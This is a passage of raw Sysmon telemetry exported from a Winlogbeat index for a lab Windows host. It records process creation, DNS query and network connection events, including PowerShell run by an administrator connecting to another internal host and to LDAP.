ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\servicing\TrustedInstaller.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8276 (WinBuild.160101.0800)"	" - "	"MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F"	"C:\Windows\servicing\TrustedInstaller.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TrustedInstaller.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0ac5-6a18-6b01-000000002300}"	3996	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:28:37.520"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17362	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:28:35.073"	"RhDqbZ4ByrYY_kgLD4P8"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:28:36.367"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:28:35.071
ProcessGuid: {6e4a868b-0ac3-6a18-6901-000000002300}
ProcessId: 6948
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0ac3-6a18-6901-000000002300}"	6948	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:28:35.071"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17361	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:18:37.490"	"1BDhbZ4ByrYY_kgLDYFv"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:18:39.028"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:18:37.482
ProcessGuid: {6e4a868b-086d-6a18-6701-000000002300}
ProcessId: 6148
Image: C:\Windows\servicing\TrustedInstaller.exe
FileVersion: 10.0.17763.8276 (WinBuild.160101.0800)
Description: Windows Modules Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\servicing\TrustedInstaller.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8276 (WinBuild.160101.0800)"	" - "	"MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F"	"C:\Windows\servicing\TrustedInstaller.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TrustedInstaller.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-086d-6a18-6701-000000002300}"	6148	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:18:37.482"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17359	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:18:35.074"	"0hDhbZ4ByrYY_kgLDYFv"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:18:37.026"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:18:35.073
ProcessGuid: {6e4a868b-086b-6a18-6501-000000002300}
ProcessId: 6576
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-086b-6a18-6501-000000002300}"	6576	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:18:35.073"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17358	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:17:47.298"	"WRDgbZ4ByrYY_kgLMoFP"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:17:47.997"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:17:46.413
ProcessGuid: {6e4a868b-012d-6a18-1800-000000002300}
ProcessId: 1060
QueryName: eonqdfzhsfdembp
QueryStatus: 1460
QueryResults: -
Image: C:\Windows\System32\svchost.exe
User: NT AUTHORITY\NETWORK SERVICE"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\svchost.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-012d-6a18-1800-000000002300}"	1060	" - "	" - "	eonqdfzhsfdembp	"'-"	1460	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\NETWORK SERVICE"	"2026-05-28 09:17:46.413"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17357	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:17:47.298"	"WBDgbZ4ByrYY_kgLMoFP"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:17:47.997"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:17:46.312
ProcessGuid: {6e4a868b-012e-6a18-1d00-000000002300}
ProcessId: 1320
QueryName: WIN-JOCP945SK51.lab2019.local
QueryStatus: 0
QueryResults: ::1;::ffff:192.168.1.251;
Image: C:\Windows\System32\svchost.exe
User: NT AUTHORITY\NETWORK SERVICE"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\svchost.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-012e-6a18-1d00-000000002300}"	1320	" - "	" - "	"WIN-JOCP945SK51.lab2019.local"	"::1;::ffff:192.168.1.251;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\NETWORK SERVICE"	"2026-05-28 09:17:46.312"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17356	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:17:47.297"	"VxDgbZ4ByrYY_kgLMoFP"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:17:47.997"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:17:45.290
ProcessGuid: {6e4a868b-012d-6a18-1800-000000002300}
ProcessId: 1060
QueryName: WIN-JOCP945SK51
QueryStatus: 0
QueryResults: 192.168.1.251;
Image: C:\Windows\System32\svchost.exe
User: NT AUTHORITY\NETWORK SERVICE"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\svchost.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-012d-6a18-1800-000000002300}"	1060	" - "	" - "	"WIN-JOCP945SK51"	"192.168.1.251;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\NETWORK SERVICE"	"2026-05-28 09:17:45.290"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17355	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:15:47.164"	"TxDebZ4ByrYY_kgLdIGk"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:15:48.933"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:15:45.157
ProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ProcessId: 1192
QueryName: WIN-JOCP945SK51.LAB2019.LOCAL
QueryStatus: 0
QueryResults: ::1;::ffff:192.168.1.251;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	" - "	" - "	"WIN-JOCP945SK51.LAB2019.LOCAL"	"::1;::ffff:192.168.1.251;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"LAB2019\Administrator"	"2026-05-28 09:15:45.157"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17353	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:15:47.164"	"ThDebZ4ByrYY_kgLdIGk"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:15:48.933"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:15:45.156
ProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ProcessId: 1192
QueryName: _ldap._tcp.WIN-JOCP945SK51.LAB2019.LOCAL.
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	" - "	" - "	"_ldap._tcp.WIN-JOCP945SK51.LAB2019.LOCAL."	"'-"	9003	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"LAB2019\Administrator"	"2026-05-28 09:15:45.156"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17352	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:15:46.502"	"TRDebZ4ByrYY_kgLdIGk"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Network connection detected (rule: NetworkConnect)"	3	"May 28, 2026 @ 12:15:47.931"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Network connection detected:
RuleName: -
UtcTime: 2026-05-28 09:15:45.248
ProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ProcessId: 1192
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: LAB2019\Administrator
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.1.251
SourceHostname: WIN-JOCP945SK51.lab2019.local
SourcePort: 50058
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.1.251
DestinationHostname: WIN-JOCP945SK51.lab2019.local
DestinationPort: 389
DestinationPortName: ldap"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	"WIN-JOCP945SK51.lab2019.local"	"192.168.1.251"	false	389	ldap	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	true	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	" - "	tcp	" - "	" - "	" - "	"'-"	"WIN-JOCP945SK51.lab2019.local"	"192.168.1.251"	false	50058	"'-"	" - "	"LAB2019\Administrator"	"2026-05-28 09:15:45.248"	" - "	" - "	3	" - "	Info	"3,216"	"4,112"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17351	"Network connection detected (rule: NetworkConnect)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:15:46.149"	"TBDebZ4ByrYY_kgLdIGk"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:15:47.931"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:15:45.156
ProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ProcessId: 1192
QueryName: _ldap._tcp.Default-First-Site-Name._sites.WIN-JOCP945SK51.LAB2019.LOCAL.
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	" - "	" - "	"_ldap._tcp.Default-First-Site-Name._sites.WIN-JOCP945SK51.LAB2019.LOCAL."	"'-"	9003	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"LAB2019\Administrator"	"2026-05-28 09:15:45.156"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17350	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:15:46.149"	"SxDebZ4ByrYY_kgLdIGk"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:15:47.931"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:15:45.156
ProcessGuid: {6e4a868b-012b-6a18-0c00-000000002300}
ProcessId: 648
QueryName: _ldap._tcp.WIN-JOCP945SK51.LAB2019.LOCAL.
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\lsass.exe
User: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\lsass.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-012b-6a18-0c00-000000002300}"	648	" - "	" - "	"_ldap._tcp.WIN-JOCP945SK51.LAB2019.LOCAL."	"'-"	9003	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:15:45.156"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17349	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:15:46.149"	"ShDebZ4ByrYY_kgLdIGk"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:15:47.931"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:15:45.155
ProcessGuid: {6e4a868b-012b-6a18-0c00-000000002300}
ProcessId: 648
QueryName: _ldap._tcp.Default-First-Site-Name._sites.WIN-JOCP945SK51.LAB2019.LOCAL.
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\lsass.exe
User: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\lsass.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-012b-6a18-0c00-000000002300}"	648	" - "	" - "	"_ldap._tcp.Default-First-Site-Name._sites.WIN-JOCP945SK51.LAB2019.LOCAL."	"'-"	9003	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:15:45.155"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17348	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:15:25.901"	"OxDebZ4ByrYY_kgLLIHv"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Network connection detected (rule: NetworkConnect)"	3	"May 28, 2026 @ 12:15:27.919"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Network connection detected:
RuleName: -
UtcTime: 2026-05-28 09:15:24.714
ProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ProcessId: 1192
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: LAB2019\Administrator
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.1.251
SourceHostname: WIN-JOCP945SK51.lab2019.local
SourcePort: 50055
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.1.218
DestinationHostname: -
DestinationPort: 8080
DestinationPortName: -"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	"'-"	"192.168.1.218"	false	8080	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	true	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	" - "	tcp	" - "	" - "	" - "	"'-"	"WIN-JOCP945SK51.lab2019.local"	"192.168.1.251"	false	50055	"'-"	" - "	"LAB2019\Administrator"	"2026-05-28 09:15:24.714"	" - "	" - "	3	" - "	Info	"3,216"	"4,112"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17347	"Network connection detected (rule: NetworkConnect)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
